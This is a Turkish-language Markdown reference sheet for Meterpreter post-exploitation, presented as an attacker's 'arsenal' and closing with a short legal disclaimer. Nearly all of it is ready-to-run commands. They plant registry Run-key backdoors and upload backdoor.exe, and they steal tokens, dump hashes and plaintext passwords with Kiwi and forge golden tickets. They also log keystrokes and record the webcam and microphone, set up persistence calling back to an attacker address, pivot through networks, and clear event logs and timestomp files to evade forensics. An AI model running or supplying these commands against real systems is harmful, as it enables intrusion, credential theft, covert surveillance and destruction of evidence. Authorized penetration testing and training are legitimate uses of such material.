# 🎭 Meterpreter - Kapsamlı Başvuru Kılavuzu

[🇬🇧 English](../Meterpreter.md)

```
    ███╗   ███╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗ ███████╗████████╗███████╗██████╗ 
    ████╗ ████║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██╔████╔██║█████╗     ██║   █████╗  ██████╔╝██████╔╝██████╔╝█████╗     ██║   █████╗  ██████╔╝
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██╔══╝     ██║   ██╔══╝  ██╔══██╗
    ██║ ╚═╝ ██║███████╗   ██║   ███████╗██║  ██║██║     ██║  ██║███████╗   ██║   ███████╗██║  ██║
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

![Meterpreter](https://img.shields.io/badge/Meterpreter-Oturumu-purple?style=for-the-badge)
![Sömürü Sonrası](https://img.shields.io/badge/Sömürü_Sonrası-orange?style=for-the-badge)
![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-Linux-green?style=for-the-badge)

> **Sömürü sonrası (post-exploitation) aşamasının en gelişmiş aracı** - Hedefe erişim sağladıktan sonraki eksiksiz cephaneliğiniz

---

## 📋 İçindekiler

- [Meterpreter Nedir?](#-meterpreter-nedir)
- [Temel Konsol Komutları](#-temel-konsol-komutları)
- [Sistem Bilgisi Toplama](#-sistem-bilgisi-toplama)
- [Dosya Sistemi Komutları](#-dosya-sistemi-komutları)
- [Ağ Komutları](#-ağ-komutları)
- [Süreç (Process) Yönetimi](#-süreç-process-yönetimi)
- [Kullanıcı ve Yetki Yönetimi](#-kullanıcı-ve-yetki-yönetimi)
- [Parola ve Kimlik Bilgisi Toplama (Password Harvesting)](#-parola-ve-kimlik-bilgisi-toplama-password-harvesting)
- [Klavye Dinleme (Keylogging)](#-klavye-dinleme-keylogging)
- [Ekran Görüntüsü ve Kamera](#-ekran-görüntüsü-ve-kamera)
- [Kalıcılık Sağlama (Persistence)](#-kalıcılık-sağlama-persistence)
- [Ağ İçi Geçiş (Pivoting) ve Port Yönlendirme](#-ağ-içi-geçiş-pivoting-ve-port-yönlendirme)
- [Adli Bilişim İzlerini Temizleme (Anti-Forensics)](#-adli-bilişim-izlerini-temizleme-anti-forensics)
- [Betikleme ve Otomasyon](#-betikleme-ve-otomasyon)
- [Hızlı Başvuru Tablosu](#-hızlı-başvuru-tablosu)
- [İpuçları ve Püf Noktaları](#-ipuçları-ve-püf-noktaları)

---

## 🎯 Meterpreter Nedir?

**Meterpreter** (Meta-Interpreter), hedef sistemde doğrudan RAM (bellek) içinde DLL enjeksiyonu yöntemiyle çalışan, diske dosya yazmadığı için tespit edilmesi son derece güç olan dinamik ve genişletilebilir bir saldırı yüküdür.

### Temel Özellikler

| Özellik | Açıklama |
|---------|----------|
| **Bellekte Çalışma (In-Memory)** | Diske dosya yazmadan tamamen RAM üzerinde çalışır, minimum iz bırakır |
| **Şifreli İletişim** | Komuta Kontrol (C2) sunucusu ile TLS şifreli kanal üzerinden haberleşir |
| **Dinamik Genişletilebilirlik** | İhtiyaç duyulan modüller çalışma anında yüklenir (Kiwi, Incognito vb.) |
| **Çoklu Platform Desteği** | Windows, Linux, macOS, Android, PHP, Java, Python ortamlarında çalışır |
| **Pivoting Yeteneği** | Ele geçirilen makineyi iç ağa geçiş köprüsü olarak kullanabilir |

---

## ⌨️ Temel Konsol Komutları

### Yardım ve Gezinme

```bash
# Tüm kullanılabilir komutları listele
meterpreter > help

# Belirli bir komutun kullanım detayını göster
meterpreter > help upload

# Aktif kanalları listele
meterpreter > channel -l
```

### Oturum Yönetimi

```bash
# Oturum özetini göster
meterpreter > info

# Oturumu kapatmadan arka plana at (msfconsole'a dön)
meterpreter > background
meterpreter > bg

# Standart msfconsole arayüzüne çık
meterpreter > exit

# Oturumu tamamen sonlandır ve kapat
meterpreter > quit

# Taşıma protokollerini listele / yeni bağlantı noktası ekle
meterpreter > transport list
meterpreter > transport add -t reverse_tcp -l <LHOST> -p <LPORT>
```

---

## 💻 Sistem Bilgisi Toplama

### Temel Sistem Bilgileri

```bash
# İşletim sistemi, mimari ve ana makine detayları
meterpreter > sysinfo

# Geçerli kullanıcı adı
meterpreter > getuid
Server username: WIN-PC\Administrator

# Geçerli Meterpreter sürecinin PID'si
meterpreter > getpid

# Süreç adı
meterpreter > getpname

# Sistemin sanal makine olup olmadığını kontrol et
meterpreter > run post/windows/gather/checkvm
```

### Ortam Değişkenleri ve Kayıt Defteri (Registry)

```bash
# Ortam değişkenlerini okuma
meterpreter > getenv PATH
meterpreter > getenv USERNAME

# Ortam değişkeni atama
meterpreter > setenv DEGISKEN deger

# Windows Registry işlemleri
meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v SecurityHealth
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d "C:\\backdoor.exe"
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

### Yüklü Yazılımlar ve Yamalar
```bash
# Yüklü programları listele
meterpreter > run post/windows/gather/enum_applications

# Yüklü güvenlik güncellemelerini ve hotfix'leri listele
meterpreter > run post/windows/gather/enum_patches
```

---

## 📁 Dosya Sistemi Komutları

### Gezinme ve Dizin İşlemleri

```bash
# Hedefteki mevcut dizin
meterpreter > pwd

# Dizin içeriğini listele
meterpreter > ls
meterpreter > ls -la

# Dizin değiştir
meterpreter > cd C:\\Users
meterpreter > cd ..

# Kendi yerel makinenizdeki dizin
meterpreter > lpwd

# Kendi yerel makinenizdeki dizini değiştir
meterpreter > lcd /tmp
```

### Dosya İşlemleri ve Transferi

```bash
# Dosya içeriğini oku
meterpreter > cat C:\\Users\\Administrator\\Desktop\\secret.txt

# Dosyayı düzenle
meterpreter > edit C:\\file.txt

# Dosya sil
meterpreter > rm C:\\temp\\malware.exe

# Dizin oluştur
meterpreter > mkdir C:\\temp\\hidden

# Hedef makineden dosya indir (Download)
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt /tmp/
meterpreter > download -r C:\\Users\\Administrator\\Documents

# Hedef makineye dosya yükle (Upload)
meterpreter > upload /tmp/backdoor.exe C:\\Windows\\Temp\\
```

### Dosya Arama ve Zaman Damgası Değiştirme (Timestomp)

```bash
# Dosya arama
meterpreter > search -f *.kdbx
meterpreter > search -f *password* -d C:\\Users

# Dosya zaman damgalarını değiştirme (Adli bilişim atlatma)
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\cmd.exe
meterpreter > timestomp C:\\backdoor.exe -z "01/01/2020 00:00:00"
```

---

## 🌐 Ağ Komutları

```bash
# Ağ arayüzleri ve IP bilgileri
meterpreter > ipconfig

# Yönlendirme tablosu
meterpreter > route

# ARP tablosu
meterpreter > arp

# Aktif bağlantılar ve dinleyen portlar
meterpreter > netstat
```

### Port Yönlendirme (Port Forwarding)

```bash
# Uzaktaki hedef portu yerel makineye yönlendirme
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100

# Port yönlendirmeleri listele
meterpreter > portfwd list

# RDP yönlendirmesi örneği
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
# Artık yerel makineden bağlanabilirsiniz: rdesktop 127.0.0.1:3389
```

---

## ⚙️ Süreç (Process) Yönetimi

### Süreçleri Listeleme ve Süreç Göçü (Migrate)

```bash
# Tüm çalışan süreçleri listele
meterpreter > ps

# Belirli bir süreci bul
meterpreter > pgrep explorer.exe

# Başka bir sürece geçiş yap (Migrate)
meterpreter > migrate <PID>
meterpreter > migrate -N explorer.exe

# Komut çalıştır
meterpreter > execute -f cmd.exe -a "/c whoami" -i -H

# Standart sistem komut kabuğuna geç
meterpreter > shell
```

> **Önemli İpucu:** Oturum açıldıktan hemen sonra kararlı bir kullanıcı sürecine (ör. `explorer.exe`) veya sistem sürecine (`svchost.exe`) migrate olmak oturumun düşmesini engeller.

---

## 👤 Kullanıcı ve Yetki Yönetimi

```bash
# Geçerli kullanıcı ve izinleri kontrol et
meterpreter > getuid
meterpreter > getprivs

# SYSTEM yetkisine yükselme denemesi
meterpreter > getsystem

# Başka bir sürecin token'ını çalma (Token Stealing)
meterpreter > steal_token <PID>

# Çalınan token'ı bırakıp orijinale dönme
meterpreter > drop_token

# Incognito eklentisi ile token numaralandırma
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\Administrator"
```

---

## 🔐 Parola ve Kimlik Bilgisi Toplama (Password Harvesting)

### SAM Veritabanı Hash Dökümü
```bash
# Parola hash'lerini dökme (SYSTEM yetkisi gerektirir)
meterpreter > hashdump

# Akıllı hash dökümü
meterpreter > run post/windows/gather/smart_hashdump
```

### Mimikatz / Kiwi Entegrasyonu
```bash
# Kiwi eklentisini yükleme
meterpreter > load kiwi

# Bellekteki tüm kimlik bilgilerini dökme (Düz metin parolalar)
meterpreter > creds_all
meterpreter > kiwi_cmd sekurlsa::logonpasswords

# Kerberos biletlerini dökme
meterpreter > kiwi_cmd sekurlsa::tickets

# Wi-Fi parolalarını çıkarma
meterpreter > kiwi_cmd misc::wifi

# Golden Ticket üretme
meterpreter > golden_ticket_create -d domain.local -k <krbtgt_hash> -s <domain_sid> -u Administrator -t /tmp/golden.kirbi
```

---

## ⌨️ Klavye Dinleme (Keylogging)

```bash
# Klavye dinleyicisini başlat
meterpreter > keyscan_start

# Kaydedilen tuş vuruşlarını ekrana dök
meterpreter > keyscan_dump

# Dinleyiciyi durdur
meterpreter > keyscan_stop
```

---

## 📸 Ekran Görüntüsü ve Kamera

```bash
# Anlık masaüstü ekran görüntüsü al
meterpreter > screenshot

# Gerçek zamanlı ekran paylaşımı (tarayıcıda açılır)
meterpreter > screenshare

# Web kameralarını listele
meterpreter > webcam_list

# Kameradan anlık fotoğraf çek
meterpreter > webcam_snap

# Kameradan canlı yayın başlat
meterpreter > webcam_stream

# Ortamdaki mikrofonu 30 saniye boyunca kaydet
meterpreter > record_mic -d 30
```

---

## 🔄 Kalıcılık Sağlama (Persistence)

```bash
# Registry üzerinden kalıcılık
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50

# Zamanlanmış görev ile kalıcılık
meterpreter > run post/windows/manage/persistence_exe

# WMI tabanlı kalıcılık
meterpreter > run post/windows/manage/wmi_persistence
```

---

## 🔀 Ağ İçi Geçiş (Pivoting) ve Rota Yönetimi

```bash
# Ele geçirilen makine üzerinden yeni ağa rota ekle
meterpreter > run autoroute -s 10.10.10.0/24

# Eklenen rotaları görüntüle
meterpreter > run autoroute -p
```

---

## 🧹 Adli Bilişim İzlerini Temizleme (Anti-Forensics)

```bash
# Windows Olay Günlüklerini (Event Logs) temizle
meterpreter > clearev

# Dosya oluşturma ve düzenleme tarihlerini orijinal sistem dosyalarıyla eşle
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\calc.exe
```

---

## 📊 Hızlı Başvuru Tablosu

| Komut | Açıklama |
|-------|----------|
| `sysinfo` | Hedef sistem mimari ve işletim sistemi bilgisi |
| `getuid` | Geçerli kullanıcı adı |
| `getsystem` | SYSTEM yetkisine yükselme |
| `ps` | Süreç listesi |
| `migrate <PID>` | Belirtilen sürece göç etme |
| `hashdump` | SAM parola hash'lerini çıkarma |
| `load kiwi` | Mimikatz modülünü aktif etme |
| `creds_all` | Bellekteki tüm parolaları dökme |
| `shell` | İşletim sistemi komut satırına geçme |
| `upload / download` | Dosya yükleme / indirme |
| `screenshot` | Ekran görüntüsü alma |
| `keyscan_start` | Tuş kaydediciyi başlatma |
| `clearev` | Olay kayıtlarını temizleme |

---

## 💡 İpuçları ve Püf Noktaları

1. **İlk Kural: Hemen Migrate Olun:** Hedef oturumu açar açmaz ilk işiniz kararlı bir sürece (`explorer.exe`, `svchost.exe`) taşınmak olmalıdır.
2. **Oturumu Kapatmayın, Background Yapın:** İşiniz bittiğinde `exit` yerine `bg` veya `background` yazarak oturumu açık tutun.
3. **HTTPS Payload'ları Tercih Edin:** Güvenlik duvarları ve IDS/IPS sistemleri HTTP trafiğini denetleyebilirken, `reverse_https` şifreli olduğu için daha güvenlidir.

---

## ⚠️ Yasal Uyarı

> **DİKKAT:** Meterpreter yetkili sızma testleri ve eğitim laboratuvarları için tasarlanmıştır. İzin alınmamış sistemler üzerinde kullanılması yasa dışıdır.

---

<p align="center">
  <b>🎭 Sömürü Sonrası Cephaneliğiniz Tamamlandı!</b><br>
  <i>Erişim sağlandıktan sonra kontrol tamamen sizin elinizde</i>
</p>
